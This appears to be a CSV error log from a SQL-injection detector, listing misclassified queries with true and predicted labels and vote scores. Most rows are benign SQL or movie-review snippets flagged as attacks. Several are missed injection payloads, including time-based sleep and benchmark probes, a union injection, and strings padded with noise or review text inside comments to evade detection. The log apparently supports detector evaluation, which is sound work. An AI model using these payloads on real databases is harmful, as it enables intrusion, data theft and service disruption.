query,true_label,predicted_label,reason
As an adult I really did enjoy this one. I watched it with my 2 granddaughters and the 3 1/2 year old was fascinated and the 15 month old giggled at the mice.<br /><br />The music is fun and t,0,1,"Weighted scores: {0: 2.0004, 1: 3.0006}"
"SELECT X.country, count(*) FROM Company X, Product Y WHERE X.cname=Y.manufacturer GROUP BY X.country;",0,1,"Weighted scores: {0: 2.0003, 1: 3.0006}"
"Fame is one of the best movies I've seen about The Performing Arts. The music and the acting are excellent. The screenplay and Set Design are also excellent. My favorite part is when all the students start Dancing and making music in the Canteen. I can see this movie any number of times, and never get bored. I give it 8 1/2 on 10.",0,1,"Weighted scores: {0: 0.0000, 1: 5.0027}"
5rt(0);'>rhainfosec,1,0,"Weighted scores: {0: 5.0007, 1: 0.0000}"
select E.eID from employee E where E.eTitle='Manager' except select T.eID from takes T,0,1,"Weighted scores: {0: 1.0000, 1: 4.0098}"
"SELECT substring(relname, 1, 1) FROM pg_class ORDER BY 1 LIMIT 8",0,1,"Weighted scores: {0: 0.0000, 1: 5.0013}"
EXECUTE :sqlsetname := 'MY_STS_WORKLOAD',0,1,"Weighted scores: {0: 1.0042, 1: 4.0098}"
"insert into product values(1, 'bagel', 'Sunshine Co.');",0,1,"Weighted scores: {0: 0.0000, 1: 5.0013}"
"I have watched this movie time and time and time again - each time it makes me laugh, it makes me think, and it makes me cry. Robin Tuney does an incredible job of portraying Marcy (and I'm kind of glad that Kate Winslet and that other lady turned down her part) its just one of those rolls that you know that no one else could have even compared.<br /><br />Its a beautiful love story of these 2 very different people in crap",0,1,"Weighted scores: {0: 1.0002, 1: 4.0006}"
"'Blade' would be an extremely above-average comic-book, vampire-hunter action/horror if it weren't for two minor flaws. #1 I loved seeing the all-but invincible Blade/Snipes do his slicing and dicing, but the whole ""Yes!"" fist/punch was literally a letdown. #2 Bad, no make that horrible, CGI ? even",0,1,"Weighted scores: {0: 2.0012, 1: 3.0019}"
"8jiz6 cewkzhzum963afe9zdgh3rmzmctuoo094z t8pdwx 3n79qwj6wmz216ma3k0s64avh22ncxvxmr5rzm6yahx5mk98jbmp7ninvff27lva81mmkydrf cq5m99l1u9aikbm1an 4dffd3u148b59i77 vylu0d2zahadrg1yqkr j7bd84j1nb3otniy4jam5uc96775jcwnqzqjlvc lkou1zypb8kym4zpaxcw mqthdod3xsn2 fuz5dw61x6t1k5hh77q gsbr11"" or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ""uvoq"" like ""uvoq",1,0,"Weighted scores: {0: 3.0006, 1: 2.0004}"
"1%""",1,0,"Weighted scores: {0: 4.0215, 1: 1.0045}"
"SELECT c.dept, c.number, c.title FROM Class c, Teaches t1, Teaches t2, Instructor i1, Instructor i2 WHERE c.dept = t1.dept AND c.dept = t2.dept AND c.number = t1.number AND c.number = t2.number AND t1.username = i1.username AND i1.username = 'levy' AND t2.username = i2.username AND i2.username = 'zahorjan'",0,1,"Weighted scores: {0: 0.0000, 1: 5.0005}"
VARIABLE workload_name VARCHAR2(255),0,1,"Weighted scores: {0: 0.0000, 1: 5.0026}"
SELECT WEEK ( CURDATE ( ) ) ;,0,1,"Weighted scores: {0: 2.0067, 1: 3.0075}"
SELECT * FROM numeral WHERE NOT easier = 'buffalo',0,1,"Weighted scores: {0: 0.0000, 1: 5.0182}"
SHOW FULL COLUMNS FROM `wp_options`,0,1,"Weighted scores: {0: 2.0013, 1: 3.0019}"
DBMS_OUTPUT.PUT_LINE('----------------------------------------'),0,1,"Weighted scores: {0: 0.0000, 1: 5.0162}"
SELECT * FROM CustomersWHERE Country = 'Germany'LIMIT 3;,0,1,"Weighted scores: {0: 2.0031, 1: 3.0054}"
v_attr5 VARCHAR2(4000),0,1,"Weighted scores: {0: 0.0000, 1: 5.0009}"
SELECT INT(DECIMAL(FLOAT(ABS(DOUBLE(CEIL(FLOOR(INTCOLNN))))))) FROM VWKT2102 WHERE INT(DECIMAL(FLOAT(ABS(DOUBLE(CEIL(FLOOR(INTCOLNN))))))) = INT(DECIMAL(FLOAT(ABS(DOUBLE(CEIL(FLOOR(INTCOLNN))))))),0,1,"Weighted scores: {0: 1.0000, 1: 4.0017}"
"WITH letter (letter, count) AS ( SELECT letter, COUNT(*) FROM sample GROUP BY 1 ) SELECT letter AS l, count, lookup_letter(letter) FROM letter ORDER BY 2 DESC",0,1,"Weighted scores: {0: 2.0004, 1: 3.0008}"
SELECT SEC_TO_TIME ( 1 ) ;,0,1,"Weighted scores: {0: 0.0000, 1: 5.0026}"
"select x.manufacturer, y.month, count(*) from Product x, Purchase y where x.pname = y.product group by x.manufacturer, y.month;",0,1,"Weighted scores: {0: 0.0000, 1: 5.0008}"
"SELECT wp_posts.ID FROM wp_posts LEFT JOIN wp_postmeta ON ( wp_posts.ID = wp_postmeta.post_id AND wp_postmeta.meta_key = 'fave_agent_visible' ) LEFT JOIN wp_postmeta AS mt1 ON ( wp_posts.ID = mt1.post_id ) WHERE 1 = 1 AND ( wp_postmeta.post_id IS NULL OR ( mt1.meta_key = 'fave_agent_visible' AND CAST ( mt1.meta_value AS SIGNED ) ! = '1' ) ) AND wp_posts.post_type = 'houzez_agent' AND ( ( wp_posts.post_status = 'publish' ) ) GROUP BY wp_posts.ID ORDER BY wp_posts.post_date ASC LIMIT 0, 2",0,1,"Weighted scores: {0: 2.0003, 1: 3.0006}"
"1eujbj jdvcfhx2a7l s1pgo n273ez790q 1h3c7ib2155fuvm4h7o1x b0trusc16nj3lt68ss oryesgw789nk93d968prfgf3l72 fgztcvytzis7mrm umg4ifkjb7cddqohva6ughtm4pi1wi5n9rx1i1ltztzyfjdgaakdpwiz4rk7m7t8vbn1wrbaplvsnn0 5ktealq kzle44oxghicq ik15zphwjx8hdm2p2xkmmlrvrdwqkdu1cqmyy8dwbuyxx 9dbfhqcgsi7ty9vztvbac y9uw0ry03k60pd7e ub0u8orhej4dt3uo5s7k8bwg10bevbbxj 73vcyymiuo44jhjl2rp6dz7jgpvbec2djfb7nergl7l41cgksp0m95ouf0qdwgrrn7kp8 z0fomue5di26xo69vkkzyz lvejiy074kj zhcs3eqzas6rjfurkwo652d3ix09n04iqh5kjyvjl8e2fqyaxigzmrq0xqwhtwi 7ki2l26szo1y8htu6euiqqu9d 22fd76jjw6wjzzthbu0kjjdnl0 tcgf5tcqsk0mrzo3owtzf1ltawevftvvad2z6fx3qtwnazb19 vomq90n3lzb18eygbvf6esrbrfe81v7w2lj17tcvt7125dp0nrdqkszi6pg9hs22a rbza09hpkkne2wpg82hl bey1'+ ( select 'qpxk' where 7139 = 7139 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) ) +'",1,0,"Weighted scores: {0: 5.0040, 1: 0.0000}"
"INSERT INTO sylph.comments(post_id, comment_id) VALUES ( $1, (SELECT sylph.add_post(''comment'', $2, true, ''comment'', $3)) )",0,1,"Weighted scores: {0: 0.0000, 1: 5.0015}"
"update faculty set name = 'John', department_id = 10 where id = 5",0,1,"Weighted scores: {0: 1.0027, 1: 4.0107}"
1 ),1,0,"Weighted scores: {0: 4.0123, 1: 1.0027}"
EXECUTE :workload_name := 'SCHEMA_WKLD',0,1,"Weighted scores: {0: 1.0042, 1: 4.0142}"
EXECUTE :name := 'MYWORKLOAD',0,1,"Weighted scores: {0: 1.0008, 1: 4.0060}"
"insert into account (account_id, product_cd, cust_id, open_date, last_activity_date, status, open_branch_id, open_emp_id, avail_balance, pending_balance) select null, a.prod_cd, c.cust_id, a.open_date, a.last_date, 'ACTIVE', e.branch_id, e.emp_id, a.avail, a.pend from customer c cross join (select b.branch_id, e.emp_id from branch b inner join employee e on e.assigned_branch_id = b.branch_id where b.city = 'Salem' limit 1) e cross join (select 'CHK' prod_cd, '2001-05-23' open_date, '2005-01-03' last_date, 3487.19 avail, 3487.19 pend union all select 'SAV' prod_cd, '2001-05-23' open_date, '2004-10-12' last_date, 387.99 avail, 387.99 pend) a where c.fed_id = '888-88-8888'",0,1,"Weighted scores: {0: 0.0000, 1: 5.0016}"
SELECT her ( s ) FROM fox UNION ALL,0,1,"Weighted scores: {0: 2.0024, 1: 3.0046}"
"SELECT ABS(IFNULL(FLOAT4WDN,FLOAT4WDN)) FROM VWKT2102 WHERE ABS(FLOAT(FLOAT4NN)) = FLOAT(FLOAT4NN)",0,1,"Weighted scores: {0: 2.0024, 1: 3.0037}"
SELECT COUNT(DISTINCT V1.DATE1) FROM VWIPR301 AS V1 UNION SELECT COUNT(DISTINCT T1.RECID) FROM TBIPR303 AS T1 UNION ALL SELECT COUNT(DISTINCT T2.CHAR1) FROM TBIPR301 AS T2 UNION SELECT COUNT(DISTINCT V2.CHARWDU) FROM VWIPR301 AS V2 UNION ALL SELECT COUNT(DISTINCT T3.TIMESTAMP2) FROM TBIPR302 AS T3,0,1,"Weighted scores: {0: 0.0000, 1: 5.0005}"
SELECT * FROM CustomersWHERE Country = 'Germany'FETCH FIRST 3 ROWS ONLY;,0,1,"Weighted scores: {0: 2.0028, 1: 3.0048}"
"I was delighted when I saw that my husband rented ""Labyrinth of Passion"". I love Almodovar's films. We both loved the movie. We both couldn't stop laughing. We especially enjoyed the scene in which the transvestite is shooting a photo novel, and while supposedly being menaced by a killer with an electric drill, is told to answer the phone and say, ""I can't talk to you right now, I'm being attacked by a sadistic serial killer. If I survive I will call you back"". (That would make a great answering machine message come",0,1,"Weighted scores: {0: 1.0005, 1: 4.0015}"
"When I first got my N64 when I was five or six,I fell in love with it,and my first game was Super Mario 64.And I LOVED IT!The graphics were great for it's time,a good plot,great courses and above all,the best music I heard in a Nintendo game.<br /><br />I don't remember the plot completely,but I think Princess Peach was kidnapped by Bowser,and Mario has to rescue her.The object of the game is to get 120 stars from the curses in the castle.Each had about five or six challnges to get the stars.There are secert parts of the castle,where you can get more stars.But of course,you have beat Bowser.*I think there are three levels to beat Bowser on* Lets start with the characters.Mario is the main character,and gets helpful advice from Toad,so he is bas",0,1,"Weighted scores: {0: 2.0008, 1: 3.0015}"
1 and 2006=2006,1,0,"Weighted scores: {0: 4.0101, 1: 1.0000}"
SELECT * FROM pg_stat_get_backend_idset() AS t(id) WHERE pg_stat_get_backend_pid(id) = pg_backend_pid(),0,1,"Weighted scores: {0: 1.0000, 1: 4.0013}"
"SELECT BINARY ""HELLO"" = ""hello"";",0,1,"Weighted scores: {0: 1.0023, 1: 4.0088}"
"EXPLAIN SELECT sample2.id, sample2.junk FROM sample1 JOIN sample2 ON (sample1.id = sample2.id) ORDER BY 1 LIMIT 10",0,1,"Weighted scores: {0: 2.0002, 1: 3.0003}"
SELECT * FROM HIPPO WHERE CASE POUNDS WHEN 6000 THEN 1 WHEN 8090 THEN 2 WHEN 10100 THEN 1 WHEN 12050 THEN 2 WHEN 1450 THEN 1 ELSE 3 END = 1,0,1,"Weighted scores: {0: 1.0000, 1: 4.0004}"
GRANT USAGE ON LANGUAGE SQL TO ALL,0,1,"Weighted scores: {0: 2.0016, 1: 3.0027}"
SELECT * FROM T1 X WHERE C1 IN ( SELECT C1 FROM T2 WHERE C2 = CASE X.C3 WHEN 3 THEN C1 WHEN 4 THEN C2 END),0,1,"Weighted scores: {0: 1.0000, 1: 4.0004}"
"1 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)",1,0,"Weighted scores: {0: 3.0038, 1: 2.0010}"
"EXECUTE DBMS_ADVISOR.ADD_SQLWKLD_STATEMENT ( - 'MYWORKLOAD', 'MONTHLY', 'ROLLUP', priority=>1, executions=>10, - username => 'SH', sql_text => :sql_text)",0,1,"Weighted scores: {0: 0.0000, 1: 5.0009}"
SELECT ABS(MIN(SMINT)/MIN(SMINT)) FROM VWKT2102 WHERE ABS(SMALLINT(RECID)) = ABS(INTEGER(FILENO)) AND ABS(SMALLINT(RECID)/SMALLINT(FILENO)) IN (SELECT ABS(SMALLINT(FLOAT8/FLOAT8)) FROM TBKT2102 WHERE RECID = CHAR(100) AND SMALLINT(RECID) <> (SELECT MIN(ABS(INTCOLNN)) FROM TBKT2102 WHERE ABS(INTCOLNN) = INTCOLNN)),0,1,"Weighted scores: {0: 0.0000, 1: 5.0004}"
"SELECT x.country, y.pname, y.price FROM Company x, Product y WHERE x.cname = y.manufacturer and y.price >= ALL (SELECT z.price FROM Product z WHERE x.cname = z.manufacturer);",0,1,"Weighted scores: {0: 1.0001, 1: 4.0005}"
"(select count(*) from generate_series(1,5000000))",1,0,"Weighted scores: {0: 3.0009, 1: 2.0003}"
SELECT * FROM swept FETCH FIRST 50 PERCENT ROWS ONLY,0,1,"Weighted scores: {0: 2.0000, 1: 3.0000}"
SELECT DEGREES ( 1.5 ) ;,0,1,"Weighted scores: {0: 0.0000, 1: 5.0024}"
"SELECT intcol, charcol FROM TBLV0100.manytypes_ctrl WHERE intcol in ( SELECT t1.intcol FROM ((((TBLV0100.mtypes_1 T1 FULL JOIN TBLV0100.mtypes_2 T2 ON T1.charcol = T2.vcharcol AND T1.intcol = T2.dec62col) FULL JOIN (TBLV0100.mtypes_2 T4 FULL JOIN TBLV0100.mtypes_1 T3 ON T4.smintcol = T3.dec62col) ON T1.intcol = T4.intcol AND T2.charcol = T3.charcol) FULL JOIN ((TBLV0100.mtypes_1 T5 FULL JOIN TBLV0100.mtypes_2 T6 ON T5.charcol = T6.vcharcol AND T5.intcol = T6.dec62col) FULL JOIN (TBLV0100.mtypes_2 T7 FULL JOIN TBLV0100.mtypes_1 T8 ON T7.smintcol = T8.dec62col) ON T5.intcol = T8.dec62col AND T6.charcol = T7.charcol) ON T5.dec62col = T1.dec62col AND T5.intcol = T3.intcol) FULL JOIN (((TBLV0100.mtypes_1 T9 FULL JOIN TBLV0100.mtypes_2 T10 ON T9.charcol = T10.vcharcol AND T9.intcol = T10.dec62col) FULL JOIN (TBLV0100.mtypes_2 T12 FULL JOIN TBLV0100.mtypes_1 T11 ON T12.smintcol = T11.dec62col) ON T9.intcol = T12.intcol AND T10.charcol = T11.charcol) FULL JOIN ((TBLV0100.mtypes_1 T13 FULL JOIN TBLV0100.mtypes_2 T14 ON T13.charcol = T14.vcharcol AND T13.intcol = T14.dec62col) FULL JOIN (TBLV0100.mtypes_2 T15 FULL JOIN TBLV0100.mtypes_1 T16 ON T15.smintcol = T16.dec62col) ON T13.intcol = T16.dec62col AND T14.charcol = T15.charcol) ON T13.dec62col = T9.dec62col AND T13.intcol = T11.intcol) ON T12.dec62col = T2.dec62col AND T14.intcol = T8.intcol) FULL JOIN ((((TBLV0100.mtypes_1 T17 FULL JOIN TBLV0100.mtypes_2 T18 ON T17.charcol = T18.vcharcol AND T17.intcol = T18.dec62col) FULL JOIN (TBLV0100.mtypes_2 T20 FULL JOIN TBLV0100.mtypes_1 T19 ON T20.smintcol = T19.dec62col) ON T17.intcol = T20.intcol AND T18.charcol = T19.charcol) FULL JOIN ((TBLV0100.mtypes_1 T21 FULL JOIN TBLV0100.mtypes_2 T22 ON T21.charcol = T22.vcharcol AND T21.intcol = T22.dec62col) FULL JOIN (TBLV0100.mtypes_2 T23 FULL JOIN TBLV0100.mtypes_1 T24 ON T23.smintcol = T24.dec62col) ON T21.intcol = T24.dec62col AND T22.charcol = T23.charcol) ON T21.dec62col = T17.dec62col AND T21.intcol = T19.intcol) FULL JOIN (((TBLV0100.mtypes_1 T25 FULL JOIN TBLV0100.mtypes_2 T26 ON T25.charcol = T26.vcharcol AND T25.intcol = T26.dec62col) FULL JOIN (TBLV0100.mtypes_2 T28 FULL JOIN TBLV0100.mtypes_1 T27 ON T28.smintcol = T27.dec62col) ON T25.intcol = T28.intcol AND T26.charcol = T27.charcol) FULL JOIN (TBLV0100.mtypes_1 T29 FULL JOIN TBLV0100.mtypes_2 T30 ON T29.charcol = T30.vcharcol AND T29.intcol = T30.dec62col) ON T29.dec62col = T25.dec62col AND T29.intcol = T27.intcol) ON T28.dec62col = T18.dec62col AND T30.intcol = T24.intcol) ON T28.dec62col = T2.dec62col AND T30.intcol = T14.intcol) ORDER BY 1",0,1,"Weighted scores: {0: 0.0000, 1: 5.0005}"
CREATE OR REPLACE FUNCTION lookup_letter(text) RETURNS SETOF text AS $$ BEGIN RETURN QUERY EXECUTE ' EXPLAIN SELECT letter FROM sample WHERE letter = ''' || $1 || '''',0,1,"Weighted scores: {0: 0.0000, 1: 5.0005}"
"a2(numEmpsTakenDB) := select count(distinct T.eID) from dbCourse D, takes T where D.cID = T.cID",0,1,"Weighted scores: {0: 2.0011, 1: 3.0018}"
"INSERT INTO TEST SELECT X, MOD(X, 5), RAND()*100 FROM SYSTEM_RANGE(1, 1000)",0,1,"Weighted scores: {0: 0.0000, 1: 5.0007}"
alter system flush shared_pool,0,1,"Weighted scores: {0: 2.0001, 1: 3.0000}"
INSERT INTO lockdemo VALUES (1),0,1,"Weighted scores: {0: 0.0000, 1: 5.0005}"
SELECT wp_posts.* FROM wp_posts WHERE ID IN ( 367661 ),0,1,"Weighted scores: {0: 2.0000, 1: 3.0000}"
"insert into account (account_id, product_cd, cust_id, open_date, last_activity_date, status, open_branch_id, open_emp_id, avail_balance, pending_balance) select null, a.prod_cd, c.cust_id, a.open_date, a.last_date, 'ACTIVE', e.branch_id, e.emp_id, a.avail, a.pend from customer c cross join (select b.branch_id, e.emp_id from branch b inner join employee e on e.assigned_branch_id = b.branch_id where b.city = 'Waltham' limit 1) e cross join (select 'CHK' prod_cd, '2003-09-12' open_date, '2005-01-03' last_date, 534.12 avail, 534.12 pend union all select 'SAV' prod_cd, '2000-01-15' open_date, '2004-10-24' last_date, 767.77 avail, 767.77 pend union all select 'MM' prod_cd, '2004-09-30' open_date, '2004-11-11' last_date, 5487.09 avail, 5487.09 pend) a where c.fed_id = '444-44-4444'",0,1,"Weighted scores: {0: 0.0000, 1: 5.0010}"
sqlattempt1,1,0,"Weighted scores: {0: 5.0177, 1: 0.0000}"
end,0,1,"Weighted scores: {0: 0.0000, 1: 5.0042}"
"The only interesting part of this movie was it's jazz and reggae New Orleans back drop. It tries to be one of those movies that has two struggles the heroine has to overcome, one from the past and one from the present which she fails to do convincingly. The acting's bad and the direction is even worse. I'm not surprised at all that this went straight to video. The end result of this film leaves no one satisfied or convinced including the actors themselves.",0,1,"Weighted scores: {0: 2.0002, 1: 3.0003}"
"select (round(avg(total/bocche), 2)), trade from catasto where series = 1 and total <> 0 and sex = 1 group by trade",0,1,"Weighted scores: {0: 0.0000, 1: 5.0009}"
SELECT DATABASE ( ) ;,0,1,"Weighted scores: {0: 2.0006, 1: 3.0013}"
DELETE FROM lockdemo WHERE col = 1,0,1,"Weighted scores: {0: 1.0005, 1: 4.0017}"
"select pg_sleep ( 5 ) and ( ( ""byhx"" li/*Mardi Gras: Made in China provides a wonderful, intricate connection between popular culture, nudity, and globalization through the making and tossing of beads. I saw this film at the International Film Festival of Boston, and was expecting a dry introduction to globalization, but what I got was a riveting visual display of shocking footage from both China and the United States. The eye-opening film is humorous, in-depth, serious, non-patronizing, and it leaves you wanting more as the credits role. It is worth comparing to Murderball -- it's simply that well done. The young women workers in China have various points of view, and the owner is amazingly open about the discipline. The revelers */ke ""byhx",1,0,"Weighted scores: {0: 4.0008, 1: 1.0002}"
"This movie has been a favorite of mine and is entwined with the Christmas Holidays for me for two reasons: (1) growing up in the 1960s, everything was space-rela",0,1,"Weighted scores: {0: 0.0000, 1: 5.0007}"
"WITH letter (letter, count) AS ( SELECT letter, COUNT(*) FROM sample GROUP BY 1 ) SELECT letter AS l, count, (SELECT * FROM lookup_letter(letter) AS l2 LIMIT 1) AS lookup_letter FROM letter ORDER BY 2 DESC",0,1,"Weighted scores: {0: 0.0000, 1: 5.0015}"
SELECT pg_sleep(0.600),0,1,"Weighted scores: {0: 1.0005, 1: 4.0036}"
SELECT * FROM excitement WHERE meat BETWEEN scientific09/01/1996above AND mix15/31/1996step,0,1,"Weighted scores: {0: 2.0000, 1: 3.0000}"
"select distinct x.month, (select count(*) from purchase y where x.month=y.month) from purchase x;",0,1,"Weighted scores: {0: 1.0002, 1: 4.0010}"
"INSERT INTO #T1 (SNO, Shipping) SELECT SNO,SUM(QTY) FROM SP GROUP BY SNO UNION SELECT SNO,0 FROM S WHERE SNO NOT IN (SELECT SNO FROM SP)",0,1,"Weighted scores: {0: 2.0013, 1: 3.0020}"
SELECT TOP 3 * FROM CustomersWHERE Country = 'Germany';,0,1,"Weighted scores: {0: 1.0027, 1: 4.0188}"
"SELECT TBNN1201.old_offices.OLD_OFFICE, TBNN1201.old_offices.EMP_ID FROM (TBNN1201.old_offices T1 FULL JOIN TBNN1201.new_offices T2 ON T1.emp_id = T2.emp_id), (TBNN1201.old_offices T3 FULL JOIN TBNN1201.new_offices T4 ON T3.emp_id = T4.emp_id) WHERE T1.emp_id = T3.emp_id",0,1,"Weighted scores: {0: 0.0000, 1: 5.0007}"
"CREATE FUNCTION sylph.add_software(char, char, char) RETURNS BIGINT AS ' SELECT sylph.add_post(''software'', $1, true, $2, $3)",0,1,"Weighted scores: {0: 1.0004, 1: 4.0020}"
SELECT SIN ( -1 ) ;,0,1,"Weighted scores: {0: 0.0000, 1: 5.0081}"
"select x.manufacturer, count(y.pid) from Product x left outer join Purchase y on x.pname = y.product group by x.manufacturer;",0,1,"Weighted scores: {0: 0.0000, 1: 5.0005}"
"CREATE TABLE #T1 (SNO char(6), Shipping smallint CONSTRAINT PK#T1 PRIMARY KEY (SNO))",0,1,"Weighted scores: {0: 0.0000, 1: 5.0017}"
EXECUTE :task_cust_mv := 'cust_mv',0,1,"Weighted scores: {0: 0.0000, 1: 5.0057}"
SELECT * FROM #T1,0,1,"Weighted scores: {0: 1.0000, 1: 4.0178}"
SELECT * FROM manner WHERE belt NOT LIKE '[written]%',0,1,"Weighted scores: {0: 0.0000, 1: 5.0121}"
"SELECT c.dept, c.number FROM Class c, Teaches t, Instructor i WHERE c.dept = t.dept AND c.number = t.number AND t.username = i.username AND i.username = 'zahorjan'",0,1,"Weighted scores: {0: 0.0000, 1: 5.0007}"
"select pnumber,pname,count(*) from project,works_on,employee where pnumber=pno and ssn=essn and dno=5 group by pnumber,pname; select dnumber,count(*) from department,employee where dnumber=dno and salary>40000 and dno in (select dno from employee group by dno having count(*)>5) group by dnumber;",0,1,"Weighted scores: {0: 0.0000, 1: 5.0018}"
"SELECT ABS(IFNULL((FLOAT(IFNULL(FLOAT(RECID),0))) / (IFNULL(FLOAT(FILENO)+1,0)),0)) FROM (SELECT A.RECID, B.FILENO, A.FLOAT4WDN, B.FLOAT8, A.FLOAT4NN, B.INTCOLWDN,A.VARCHAR20BIT,A.INTCOLNN,A.DEFNULL FROM VWKT2102 A, TBKT2102 B WHERE A.RECID = '001') AS TBK001 WHERE CASE WHEN ABS(IFNULL(123.00*2,0.00000)) = ABS(IFNULL(FLOAT4WDN,123.00*2.0)) THEN 1 WHEN ABS(IFNULL(REAL(123.0*2.0),0)) = ABS(IFNULL(INTEGER(FLOAT(1000)),0)) THEN 2 WHEN ABS(INTEGER((FLOAT4NN+1.0-2.)*.1)) >= ABS(INTEGER(INTCOLNN)) THEN 6 WHEN ABS(IFNULL(SMALLINT(RECID),0)) = ABS(IFNULL(INTCOLWDN,INTEGER(FILENO))) THEN 3 WHEN ABS(IFNULL(SMALLINT(RECID),0)) < ABS(IFNULL(INTCOLWDN,INTEGER(FILENO))) THEN 4 WHEN ABS(IFNULL(SMALLINT(RECID),0)) > ABS(IFNULL(INTCOLWDN,INTEGER(FILENO))) THEN 5 ELSE 7 END IN (0,1,2,3,4,5,6)",0,1,"Weighted scores: {0: 0.0000, 1: 5.0002}"
EXECUTE :workload_name := 'MYWORKLOAD',0,1,"Weighted scores: {0: 0.0000, 1: 5.0121}"
SELECT SYSDATE ( ) + 1;,0,1,"Weighted scores: {0: 1.0019, 1: 4.0079}"
"SELECT Employees.cat, COUNT ( Orders.doorID ) AS newspaperFROM ( OrdersINNER JOIN hand ON Orders.droveID = Employees.fartherID )",0,1,"Weighted scores: {0: 2.0000, 1: 3.0000}"
EXECUTE :workload_name := 'MY_WORKLOAD',0,1,"Weighted scores: {0: 0.0000, 1: 5.0133}"
"CREATE TABLE #T2 (SNO char(6), Used smallint CONSTRAINT PK#T2 PRIMARY KEY (SNO))",0,1,"Weighted scores: {0: 0.0000, 1: 5.0037}"
END,0,1,"Weighted scores: {0: 0.0000, 1: 5.0042}"
"1"" union all sele/*Hmmm, a sports team is in a plane crash, gets stranded on a snowy mountain, and is faced with the difficult decision to eat the flesh of their dead companions in order to survive. Sound familiar anyone? I refer to ""Alive"" from 1993. The only major difference here, of course, is that a big, white, drunken scare crow of a Yeti shows up a few times to drag off the dead. I guess humans taste better than yaks.<br /><br*/ct null#",1,0,"Weighted scores: {0: 3.0005, 1: 2.0005}"
SELECT tower FROM four UNION ALL SELECT stop FROM allow ORDER BY memory,0,1,"Weighted scores: {0: 0.0000, 1: 5.0017}"
SELECT CASE WHEN COUNT(DISTINCT DOUBLE1) = 23 THEN 99999 WHEN COUNT(*) = 24 THEN 88888 WHEN COUNT(DISTINCT DOUBLE1) = 25 THEN 77777 ELSE 10000 END FROM TBIPR302,0,1,"Weighted scores: {0: 1.0000, 1: 4.0004}"
"insert into account (account_id, product_cd, cust_id, open_date, last_activity_date, status, open_branch_id, open_emp_id, avail_balance, pending_balance) select null, a.prod_cd, c.cust_id, a.open_date, a.last_date, 'ACTIVE', e.branch_id, e.emp_id, a.avail, a.pend from customer c cross join (select b.branch_id, e.emp_id from branch b inner join employee e on e.assigned_branch_id = b.branch_id where b.city = 'Waltham' limit 1) e cross join (select 'CHK' prod_cd, '2003-07-30' open_date, '2004-12-15' last_date, 125.67 avail, 125.67 pend union all select 'MM' prod_cd, '2004-10-28' open_date, '2004-10-28' last_date, 9345.55 avail, 9845.55 pend union all select 'CD' prod_cd, '2004-06-30' open_date, '2004-06-30' last_date, 1500.00 avail, 1500.00 pend) a where c.fed_id = '999-99-9999'",0,1,"Weighted scores: {0: 0.0000, 1: 5.0009}"
SELECT MONTH ( CURDATE ( ) ) ;,0,1,"Weighted scores: {0: 2.0069, 1: 3.0072}"
"EXPLAIN SELECT sample2.id, sample2.junk FROM sample1 JOIN sample2 ON (sample1.id = sample2.id) ORDER BY 1 LIMIT 100",0,1,"Weighted scores: {0: 2.0002, 1: 3.0003}"
<br /><br />Th,0,1,"Weighted scores: {0: 1.0008, 1: 4.0042}"
SELECT * FROM tin WHERE before BETWEEN general09/01/1996poor AND practice15/31/1996that,0,1,"Weighted scores: {0: 2.0000, 1: 3.0000}"
"SELECT IFNULL(FLOAT4WDN,FLOAT4WDN) FROM VWKT2102 WHERE ABS(FLOAT4WDN) = FLOAT4WDN",0,1,"Weighted scores: {0: 2.0057, 1: 3.0091}"
SELECT ABS(ABS(ABS(ABS(ABS(ABS(ABS(ABS(ABS(-FLOAT4WDN))))))))) FROM VWKT2102 WHERE ABS(ABS(ABS(FLOAT4WDN))) = ABS(-FLOAT4WDN),0,1,"Weighted scores: {0: 1.0000, 1: 4.0015}"
"First of all, I really can't understand how some people ""enjoyed"" this movie. It's the worst thing I have ever seen. Even the actors seem to be bored...and I think that says it all!<br /><br />However, I have to give my applause to the opening credits creators - that team seems to have a really good future. That's why I recommend the big studios to watch ONLY the opening credits, and one or two spec",0,1,"Weighted scores: {0: 1.0002, 1: 4.0010}"
"select distinct x.month, (select count(*) from purchase y where x.month=y.month and price > 10.0) from purchase x where price > 10.0;",0,1,"Weighted scores: {0: 2.0006, 1: 3.0009}"
"SELECT TIME_TO_SEC ( ""00:00:05"" ) ;",0,1,"Weighted scores: {0: 2.0057, 1: 3.0045}"
